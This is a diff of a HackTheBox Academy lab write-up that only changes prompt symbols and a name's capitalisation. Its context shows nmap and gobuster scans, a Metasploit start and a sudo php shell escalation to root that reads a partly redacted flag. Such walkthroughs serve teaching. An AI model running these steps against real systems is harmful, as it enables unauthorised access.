@@ -8,7 +8,7 @@ title: Write Up for HackTheBox - Getting Started (Academy Module)
 ## nmap scan
 Machine IP: 10.129.42.249
  
-`> sudo nmap -sV -sC -O 10.129.42.249`
+`$ sudo nmap -sV -sC -O 10.129.42.249`
 
 ```bash
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-10 10:46 PDT
@@ -59,7 +59,7 @@ It's important to look at things like comments (shown in green) in the html sour
 
 While we read the source code, we can run a **Gobuster** scan to look for potential directories on the web server.
 ## Gobuster Scan
-`> gobuster -u 10.129.42.249 dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3- medium.txt -t50
+`$ gobuster -u 10.129.42.249 dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3- medium.txt -t50
 `
 ```bash
 =============================================================
@@ -136,7 +136,7 @@ Let's first search for a Metasploit module that works against our version of **G
 
 Let's open our metasploit console.
 
-`> msfconsole`
+`$ msfconsole`
 
 ```bash
 To use retry middleware with Faraday v2.0+, install `faraday-retry` gem
@@ -343,7 +343,7 @@ Now would probably be a good time for us to upgrade our terminal to a nicer TTY 
 
 Now, let's run the following commands to check what `sudo` privileges we have.
 
-` > sudo -l`
+` $ sudo -l`
 
 ```bash
 Matching Defaults entries for www-data on gettingstarted:                                                                                             
@@ -362,23 +362,23 @@ sudo php -r "system('$CMD');"
 ```
 To avoid any complications with declaring environmental variables, we'll use the following command as a substitute.
 
- `> sudo php -r "system('/bin/sh');"`
+ `$ sudo php -r "system('/bin/sh');"`
 
 So let's test if we escalated privileges with a simple `whoami` query.
 
 ```bash
-> whoami
+# whoami
 root
 ```
 Voila! We are now **root**. Let's run the `find` command we used earlier to find the contents of the **root.txt** file. 
 
 ```bash
-> find / -iname root.txt 2>/dev/null
+# find / -iname root.txt 2>/dev/null
 /root/root.txt
-> cd /root
-> ls
+# cd /root
+# ls
 root.txt
-> cat root.txt
+# cat root.txt
 f1fba6e9f71efb26[...]
 ```
 Congratulations, the final flag is `f1fba6e9f71efb26[...]`. You have officially completed the module!
@@ -387,4 +387,4 @@ The machine from the Getting Started module in HackTheBox Academy is a great fir
 
 **Have fun and happy hacking!**
 
- *Special Thanks to [Koi](https://koi0x.github.io/Research/), [ser3nity](https://ser3n1ty.com/), and leo.*
+ *Special Thanks to [Koi](https://koi0x.github.io/Research/), [ser3nity](https://ser3n1ty.com/), and Leo.*
